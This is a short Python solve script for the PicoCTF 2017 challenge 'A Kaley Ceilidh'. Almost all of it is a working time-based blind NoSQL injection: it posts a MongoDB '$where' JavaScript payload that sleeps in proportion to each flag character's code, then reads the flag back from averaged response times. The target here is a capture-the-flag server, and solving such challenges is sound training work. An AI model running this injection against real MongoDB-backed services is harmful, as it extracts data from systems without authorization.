#! /usr/bin/env python3
##
# Script for PicoCTF A Kaley Ceilidh challenge
# Created by Amos (LFlare) Ng
##
# Imports
import requests
import json

# Define static variables
sensitivity = 15
attempts = 3
url = "http://shell2017.picoctf.com:8080/search"
headers = {'content-type': 'application/json'}
payload = "function() {" \
          "    if(this.flag) {" \
          "        sleep(this.flag.charCodeAt(%d) * %d)" \
          "    }" \
          "    return true;" \
          "}"

flag = ""

try:
    for index in range(32): # We assume flag won't be that long
        data = {"$where": payload % (index, sensitivity)}

        total_time = 0
        for attempt in range(attempts):
            r = requests.post("http://shell2017.picoctf.com:8080/search",
                              headers=headers,
                              data=json.dumps(data))
            time = r.json()["time"]
            total_time += time

        avg_time = int(total_time / attempts)
        char_code = int(avg_time / sensitivity)
        char = chr(char_code)
        flag += char
        print("Finding flag... %s" % flag)
except json.decoder.JSONDecodeError:
    print("Flag: %s" % flag)